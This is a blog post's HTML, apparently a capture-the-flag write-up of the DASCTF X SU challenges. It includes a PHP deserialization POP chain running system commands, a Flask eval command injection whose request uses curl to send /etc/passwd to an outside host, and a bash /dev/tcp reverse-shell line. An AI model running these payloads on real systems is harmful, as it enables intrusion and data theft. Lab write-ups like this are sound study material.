@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="DASCTF X SU[TOC] ezpop源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpclass crow&amp;#123;    public $v1;    pu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dasctf*su">
+<meta property="og:url" content="https://yenannn.github.io/2022/03/27/dasctf-su/index.html">
+<meta property="og:site_name" content="Yenan&#39;s blog">
+<meta property="og:description" content="DASCTF X SU[TOC] ezpop源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpclass crow&amp;#123;    public $v1;    pu">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203270036232.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203270036234.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203270036235.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203270036236.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203270036237.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203270036238.png">
+<meta property="article:published_time" content="2022-03-26T16:35:07.000Z">
+<meta property="article:modified_time" content="2022-03-26T16:36:59.268Z">
+<meta property="article:author" content="Yenan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yenannn/picgo/master/img/202203270036232.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>dasctf*su</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2022/03/25/%E9%99%87%E5%8E%9F-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0ssrf%E6%89%93fpm/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yenannn.github.io/2022/03/27/dasctf-su/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yenannn.github.io/2022/03/27/dasctf-su/&text=dasctf*su"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yenannn.github.io/2022/03/27/dasctf-su/&title=dasctf*su"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yenannn.github.io/2022/03/27/dasctf-su/&is_video=false&description=dasctf*su"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=dasctf*su&body=Check out this article: https://yenannn.github.io/2022/03/27/dasctf-su/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yenannn.github.io/2022/03/27/dasctf-su/&title=dasctf*su"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yenannn.github.io/2022/03/27/dasctf-su/&title=dasctf*su"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yenannn.github.io/2022/03/27/dasctf-su/&title=dasctf*su"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yenannn.github.io/2022/03/27/dasctf-su/&title=dasctf*su"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yenannn.github.io/2022/03/27/dasctf-su/&name=dasctf*su&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yenannn.github.io/2022/03/27/dasctf-su/&t=dasctf*su"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DASCTF-X-SU"><span class="toc-number">1.</span> <span class="toc-text">DASCTF X SU</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezpop"><span class="toc-number">1.1.</span> <span class="toc-text">ezpop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#calc"><span class="toc-number">1.2.</span> <span class="toc-text">calc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upload"><span class="toc-number">1.3.</span> <span class="toc-text">upload</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        dasctf*su
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Yenan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-26T16:35:07.000Z" itemprop="datePublished">2022-03-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="DASCTF-X-SU"><a href="#DASCTF-X-SU" class="headerlink" title="DASCTF X SU"></a>DASCTF X SU</h2><p>[TOC]</p>
+<h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">v1</span>(<span class="variable">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1-&gt;<span class="title function_ invoke__">world</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="variable language_">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>链子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">v1</span>(<span class="variable">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1-&gt;<span class="title function_ invoke__">world</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>; <span class="comment"># 调用__toString()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;f1)();  <span class="comment"># 调用__invoke()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;m1)();  <span class="comment"># 调用__invoke()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="variable language_">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ini</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$ini</span>-&gt;f1 = <span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$ini</span>-&gt;f1-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$ini</span>-&gt;f1-&gt;a-&gt;m1 = <span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$ini</span>-&gt;f1-&gt;a-&gt;m1-&gt;v1 = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$ini</span>-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1 = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$ini</span>-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1 = <span class="string">&quot;?&gt;&lt;?php system(&#x27;cat ./*&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ini</span>);</span><br></pre></td></tr></table></figure>
+
+<p>卡了一会儿的几个点，还不熟悉：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;?&gt;&lt;?php system(&#x27;cat ./*&#x27;);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这里外面有””了，就用单引号了里面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./*</span><br></pre></td></tr></table></figure>
+
+<p>然后html是不显示php代码的，这里flag是php代码里面，要查看源码crtl+u</p>
+<p>以及后来只有特定长度字符打得通，真是傻了，怎么能不重新生成pop链…直接改命令的话pop链的字符串长度和字符串对应不上了就，要重新生成的</p>
+<p>还有一个pop链的地方：</p>
+<p>__call方法 访问不可达时调用，这里crow类调用world方法，但是没定义这个方法，所以调用call</p>
+<h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p>源码，计算处ssti过滤很多，基本不能ssti</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag    </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>只要eval不报错，就可以放到system执行，注入代码，num和log变量的区别是，eval#后面注释掉不执行，但system#不注释要执行，反斜杠是用于执行命令</p>
+<p>system下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-8-16-ubuntu:~<span class="comment"># echo 1#`whoami`</span></span><br><span class="line">1<span class="comment">#root</span></span><br></pre></td></tr></table></figure>
+
+<p>eval下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;1+1#yenan&#x27;</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>构造，因为waf了空格 %20，这里用tab %09代替，url编码的时候，产生url歧义的编码，比如/ %2F    : %3A    # %23，意义分别是目录分隔符，端口号，注释url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /calc?num=1*1%23`curl%09-d%09@%2Fetc%2Fpasswd%09yenan.club%3A18888` HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>但是找不到flag，名字或者位置部队，尝试弹shell或者写文件</p>
+<p>先在vps上放着shell.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/81.70.59.112/18888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>起一个simplehttp</p>
